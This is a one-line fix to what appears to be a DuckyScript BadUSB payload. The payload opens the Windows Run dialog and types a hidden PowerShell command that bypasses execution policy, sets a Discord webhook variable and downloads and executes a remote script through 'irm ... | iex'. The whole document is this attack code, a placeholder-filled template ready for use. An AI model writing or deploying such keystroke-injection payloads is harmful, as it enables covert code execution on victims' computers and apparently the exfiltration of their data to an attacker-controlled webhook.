@@ -1,4 +1,4 @@
 DELAY 2000
 GUI r
 DELAY 250
-STRINGLN powershell -w h -ep bypass $discord='DISCORD_WEB_HOOK'';irm URL_TO_POWERSHELL | iex
+STRINGLN powershell -w h -ep bypass $discord='DISCORD_WEB_HOOK';irm URL_TO_POWERSHELL | iex
